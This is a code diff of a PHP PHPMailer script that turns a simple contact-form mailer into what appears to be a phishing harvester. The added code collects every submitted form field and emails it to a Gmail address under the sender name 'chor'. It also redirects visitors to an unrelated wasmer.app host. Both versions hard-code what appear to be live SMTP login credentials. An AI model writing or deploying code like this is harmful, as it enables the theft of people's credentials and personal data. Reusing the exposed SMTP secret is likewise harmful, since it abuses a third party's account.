@@ -2,35 +2,57 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
+header("Location: https://fdfdfdcvxc.wasmer.app/");
+
 require 'Exception.php';
 require 'PHPMailer.php';
 require 'SMTP.php';
 
-$mail = new PHPMailer(true);
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Initialize an empty body for the email
+    $emailBody = '';
 
-try {
-    // Brevo SMTP Settings jo aapne di hain
-    $mail->isSMTP();
-    $mail->Host       = 'smtp-relay.brevo.com';
-    $mail->SMTPAuth   = true;
-    $mail->Username   = 'ab2b68001@smtp-brevo.com'; 
-    $mail->Password   = 'bsknvfTPYzK3DVt'; 
-    $mail->Port       = 587;
-    $mail->SMTPSecure = 'tls'; 
+    // Iterate through the $_POST array to collect form data
+    foreach ($_POST as $key => $value) {
+        // Append form field name and its value to the email body
+        $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
+    }
 
-    // Email Details
-    $mail->setFrom('arzajejo@arzajejo.xyz', 'Arzajejo Website');
-    $mail->addAddress('progemni7@gmail.com'); 
 
-    $mail->isHTML(true);
-    $mail->Subject = 'New Submission from ' . $_POST['email'];
-    $mail->Body    = "<h3>New Message Received</h3>
-                      <p><strong>Email:</strong> {$_POST['email']}</p>
-                      <p><strong>Message:</strong> {$_POST['message']}</p>";
 
-    $mail->send();
-    echo "Success: Email has been sent!";
-} catch (Exception $e) {
-    echo "Error: Email could not be sent. Mailer Error: {$mail->ErrorInfo}";
+    // PHPMailer object creation
+    $mail = new PHPMailer(true);
+    try {
+        // SMTP settings
+        $mail->isSMTP();
+        $mail->Host       = 'smtp-relay.brevo.com'; // Replace with your SMTP server address
+        $mail->SMTPAuth   = true;
+        $mail->Username   = 'ab2b68001@smtp-brevo.com'; // Replace with your email address
+        $mail->Password   = 'bsknvfTPYzK3DVt'; // Replace with your email password
+        $mail->SMTPSecure = 'tls';
+        $mail->Port       = 587;
+
+
+        // Email properties
+        $mail->setFrom('arzajejo@arzajejo.xyz', 'chor');
+        $mail->addAddress('progemni7@gmail.com');
+       
+
+
+      // Email recipient's address
+
+        // Email content
+        $mail->isHTML(true);
+        $mail->Subject = 'name';
+        $mail->Body = $emailBody; // Set the email body using the collected form data
+
+        // Send email
+        $mail->send();
+        echo 'Email successfully sent using PHPMailer.';
+    } catch (Exception $e) {
+        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
+    }
+} else {
+    echo "Invalid request!";
 }
 ?>
